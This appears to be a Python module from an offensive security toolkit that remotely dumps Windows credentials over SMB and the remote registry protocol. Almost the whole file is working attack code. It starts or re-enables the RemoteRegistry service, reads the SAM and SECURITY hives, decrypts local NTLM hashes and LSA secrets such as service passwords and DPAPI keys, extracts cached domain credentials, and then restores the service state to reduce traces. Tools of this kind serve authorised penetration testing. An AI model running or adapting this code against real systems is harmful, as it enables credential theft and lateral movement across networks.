"""Remote secrets extraction via Registry (MS-RRP).

Connects to the remote registry and extracts:
- SAM hashes (local account NTLM hashes)
- LSA secrets (service passwords, DPAPI keys)
- Cached domain credentials (DCC2)

All done via RPC — no execution on target, no file written.
"""

import struct
import time
from dataclasses import dataclass

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl, SERVICE_DEMAND_START, SERVICE_DISABLED
from ..rpc.winreg import WinReg
from .crypto import (
    extract_boot_key,
    compute_hashed_boot_key,
    decrypt_sam_hash_aes,
    decrypt_sam_hash_rc4,
    decrypt_lsa_key,
    decrypt_lsa_secret,
)


@dataclass
class SamHash:
    username: str
    rid: int
    ntlm_hash: str
    lm_hash: str = ""


@dataclass
class LsaSecret:
    name: str
    value: bytes
    decoded: str = ""


@dataclass
class CachedCred:
    username: str
    domain: str
    hash_hex: str


class RegistrySecrets:
    """Extract secrets from remote registry."""

    def __init__(self, session: SmbSession):
        self.session = session
        self._boot_key: bytes | None = None
        self._svc_was_disabled = False
        self._svc_was_stopped = False

    def ensure_remote_registry(self) -> None:
        """Start the RemoteRegistry service if needed."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            handle = svc.open_service("RemoteRegistry")

            try:
                svc.start_service(handle)
                self._svc_was_stopped = True
            except RuntimeError as e:
                if "0x00000422" in str(e):
                    # Service is disabled — enable it first
                    svc.change_service_start_type(handle, SERVICE_DEMAND_START)
                    self._svc_was_disabled = True
                    svc.start_service(handle)
                    self._svc_was_stopped = True
                elif "0x00000420" in str(e):
                    # Already running — nothing to do
                    pass
                else:
                    raise

            svc.close_handle(handle)

        time.sleep(1)

    def cleanup_remote_registry(self) -> None:
        """Restore RemoteRegistry service to original state."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            handle = svc.open_service("RemoteRegistry")

            if self._svc_was_stopped:
                try:
                    svc.stop_service(handle)
                except RuntimeError:
                    pass

            if self._svc_was_disabled:
                try:
                    svc.change_service_start_type(handle, SERVICE_DISABLED)
                except RuntimeError:
                    pass

            svc.close_handle(handle)

    def dump_sam(self) -> list[SamHash]:
        """Extract NTLM hashes from SAM."""
        hashes = []

        with self.session.open_pipe("winreg") as pipe:
            reg = WinReg(pipe)
            reg.bind()
            hklm = reg.open_hklm()

            # Get boot key from SYSTEM hive
            self._boot_key = self._get_boot_key(reg, hklm)

            # Get SAM F value (contains encryption metadata)
            sam_account = reg.open_key(hklm, r"SAM\SAM\Domains\Account")
            _, f_value = reg.query_value(sam_account, "F")
            hashed_boot_key = compute_hashed_boot_key(self._boot_key, f_value)

            # Determine SAM revision
            sam_revision = struct.unpack_from("<I", f_value, 0x68)[0]

            # Enumerate users
            users_key = reg.open_key(hklm, r"SAM\SAM\Domains\Account\Users")
            idx = 0
            rids = []
            while True:
                name = reg.enum_key(users_key, idx)
                if name is None:
                    break
                if name != "Names" and len(name) == 8:
                    try:
                        rids.append(int(name, 16))
                    except ValueError:
                        pass
                idx += 1

            # For each user, extract hash
            for rid in rids:
                try:
                    user_key = reg.open_key(users_key, f"{rid:08X}")
                    _, v_value = reg.query_value(user_key, "V")
                    reg.close_key(user_key)

                    sam_hash = self._parse_sam_v(v_value, rid, hashed_boot_key, sam_revision)
                    if sam_hash:
                        hashes.append(sam_hash)
                except RuntimeError:
                    continue

            reg.close_key(users_key)
            reg.close_key(sam_account)
            reg.close_key(hklm)

        return hashes

    def dump_lsa_secrets(self) -> list[LsaSecret]:
        """Extract LSA secrets from SECURITY hive."""
        secrets = []

        with self.session.open_pipe("winreg") as pipe:
            reg = WinReg(pipe)
            reg.bind()
            hklm = reg.open_hklm()

            if not self._boot_key:
                self._boot_key = self._get_boot_key(reg, hklm)

            # Get LSA encryption key
            try:
                pol_key = reg.open_key(hklm, r"SECURITY\Policy\PolEKList")
                _, pol_data = reg.query_value(pol_key, "")
                reg.close_key(pol_key)
                lsa_key = decrypt_lsa_key(self._boot_key, pol_data)
            except RuntimeError:
                reg.close_key(hklm)
                return secrets

            # Enumerate secrets
            try:
                secrets_key = reg.open_key(hklm, r"SECURITY\Policy\Secrets")
            except RuntimeError:
                reg.close_key(hklm)
                return secrets

            idx = 0
            secret_names = []
            while True:
                name = reg.enum_key(secrets_key, idx)
                if name is None:
                    break
                secret_names.append(name)
                idx += 1

            for name in secret_names:
                try:
                    curr_key = reg.open_key(secrets_key, f"{name}\\CurrVal")
                    _, encrypted = reg.query_value(curr_key, "")
                    reg.close_key(curr_key)

                    decrypted = decrypt_lsa_secret(lsa_key, encrypted)
                    secret = LsaSecret(name=name, value=decrypted)
                    secret.decoded = self._decode_secret(name, decrypted)
                    secrets.append(secret)
                except RuntimeError:
                    continue

            reg.close_key(secrets_key)
            reg.close_key(hklm)

        return secrets

    def dump_cached_creds(self) -> list[CachedCred]:
        """Extract cached domain credentials (DCC2)."""
        creds = []

        with self.session.open_pipe("winreg") as pipe:
            reg = WinReg(pipe)
            reg.bind()
            hklm = reg.open_hklm()

            if not self._boot_key:
                self._boot_key = self._get_boot_key(reg, hklm)

            # Get NL$KM (cache encryption key)
            try:
                pol_key = reg.open_key(hklm, r"SECURITY\Policy\PolEKList")
                _, pol_data = reg.query_value(pol_key, "")
                reg.close_key(pol_key)
                lsa_key = decrypt_lsa_key(self._boot_key, pol_data)
            except RuntimeError:
                reg.close_key(hklm)
                return creds

            try:
                nlkm_key = reg.open_key(hklm, r"SECURITY\Policy\Secrets\NL$KM\CurrVal")
                _, nlkm_enc = reg.query_value(nlkm_key, "")
                reg.close_key(nlkm_key)
                nl_km = decrypt_lsa_secret(lsa_key, nlkm_enc)
            except RuntimeError:
                reg.close_key(hklm)
                return creds

            # Read cache entries
            try:
                cache_key = reg.open_key(hklm, r"SECURITY\Cache")
            except RuntimeError:
                reg.close_key(hklm)
                return creds

            # NL$IterationCount for DCC2
            idx = 0
            while True:
                entry = reg.enum_value(cache_key, idx)
                if entry is None:
                    break
                name, vtype, data = entry
                if name.startswith("NL$") and name not in ("NL$Control", "NL$IterationCount"):
                    if len(data) > 96 and data[:2] != b"\x00\x00":
                        # Non-empty cache entry
                        try:
                            user_len = struct.unpack_from("<H", data, 0)[0]
                            if user_len > 0:
                                # Extract username/domain from plaintext header
                                username = data[72:72 + user_len].decode("utf-16-le", errors="ignore")
                                domain_off = 72 + user_len
                                domain_len = struct.unpack_from("<H", data, 2)[0]
                                # Pad to 4-byte boundary
                                if domain_off % 4:
                                    domain_off += 4 - (domain_off % 4)
                                domain = data[domain_off:domain_off + domain_len].decode("utf-16-le", errors="ignore")
                                # The hash itself (encrypted in cache)
                                enc_hash = data[96:112]
                                creds.append(CachedCred(
                                    username=username,
                                    domain=domain,
                                    hash_hex=enc_hash.hex(),
                                ))
                        except (struct.error, UnicodeDecodeError):
                            pass
                idx += 1

            reg.close_key(cache_key)
            reg.close_key(hklm)

        return creds

    def _get_boot_key(self, reg: WinReg, hklm: bytes) -> bytes:
        """Extract boot key from SYSTEM\\CurrentControlSet\\Control\\Lsa."""
        # First find CurrentControlSet
        select_key = reg.open_key(hklm, r"SYSTEM\Select")
        _, current_data = reg.query_value(select_key, "Current")
        reg.close_key(select_key)
        cs_num = struct.unpack_from("<I", current_data, 0)[0]
        cs_path = f"SYSTEM\\ControlSet{cs_num:03d}\\Control\\Lsa"

        lsa_key = reg.open_key(hklm, cs_path)

        # Read class names from JD, Skew1, GBG, Data subkeys
        parts = []
        for name in ("JD", "Skew1", "GBG", "Data"):
            subkey = reg.open_key(lsa_key, name)
            # The class name is returned by enum_key with special handling
            # We need to use OpenKey and get the class — but MS-RRP doesn't
            # expose class directly. We use BaseRegQueryInfoKey (opnum 16) or
            # the class is part of the key name enumeration.
            # Alternative: read the key's class via enum from parent
            class_name = self._get_key_class(reg, lsa_key, name)
            parts.append(class_name)
            reg.close_key(subkey)

        reg.close_key(lsa_key)
        return extract_boot_key(parts[0], parts[1], parts[2], parts[3])

    def _get_key_class(self, reg: WinReg, parent: bytes, name: str) -> bytes:
        """Get a key's class name by enumerating the parent's subkeys."""
        # EnumKey returns the name but not the class in our basic implementation.
        # We need BaseRegQueryInfoKey (opnum 16) to get the class.
        # For now, use a workaround: open the key and use QueryInfoKey.
        subkey = reg.open_key(parent, name)
        class_data = reg.query_info_key_class(subkey)
        reg.close_key(subkey)
        return class_data

    def _parse_sam_v(self, v_value: bytes, rid: int, hashed_boot_key: bytes, revision: int) -> SamHash | None:
        """Parse SAM V value to extract username and encrypted hash."""
        # V value structure: array of offsets+lengths, then data
        # Offset table starts at 0, each entry: offset(4) + length(4) + unknown(4)
        # Username: entry at index 1 (offset 0x0C)
        # NTLM hash: entry at index 4 (offset 0xA8 for Win10+)

        # Username offset and length
        name_offset = struct.unpack_from("<I", v_value, 0x0C)[0] + 0xCC
        name_length = struct.unpack_from("<I", v_value, 0x10)[0]
        username = v_value[name_offset:name_offset + name_length].decode("utf-16-le", errors="ignore")

        if not username:
            return None

        # NTLM hash offset (varies by version)
        nt_offset = struct.unpack_from("<I", v_value, 0xA8)[0] + 0xCC
        nt_length = struct.unpack_from("<I", v_value, 0xAC)[0]

        if nt_length == 0:
            return SamHash(username=username, rid=rid, ntlm_hash="aad3b435b51404eeaad3b435b51404ee")

        nt_data = v_value[nt_offset:nt_offset + nt_length]

        # Decrypt based on revision
        try:
            if revision == 3 or (len(nt_data) > 4 and nt_data[2] == 0x02):
                # AES (modern): skip revision(2) + offset(2), then IV(16) + encrypted
                nt_hash = decrypt_sam_hash_aes(nt_data[4:], hashed_boot_key, rid)
            else:
                # RC4 (legacy): skip revision(2) + offset(2)
                nt_hash = decrypt_sam_hash_rc4(nt_data[4:], hashed_boot_key, rid)
        except Exception:
            return SamHash(username=username, rid=rid, ntlm_hash="(decryption failed)")

        return SamHash(username=username, rid=rid, ntlm_hash=nt_hash.hex())

    def _decode_secret(self, name: str, data: bytes) -> str:
        """Try to decode a decrypted LSA secret to a readable string."""
        if not data:
            return ""

        # Service account passwords are stored as UTF-16LE
        if name.startswith("_SC_"):
            try:
                # Skip first 16 bytes (metadata), decode rest as UTF-16
                text = data.decode("utf-16-le", errors="ignore").rstrip("\x00")
                if text and all(32 <= ord(c) < 127 or c in "\r\n\t" for c in text):
                    return text
            except Exception:
                pass

        # DPAPI keys
        if name.startswith("DPAPI"):
            return data[:20].hex()

        # Default: show hex
        return data[:64].hex() + ("..." if len(data) > 64 else "")
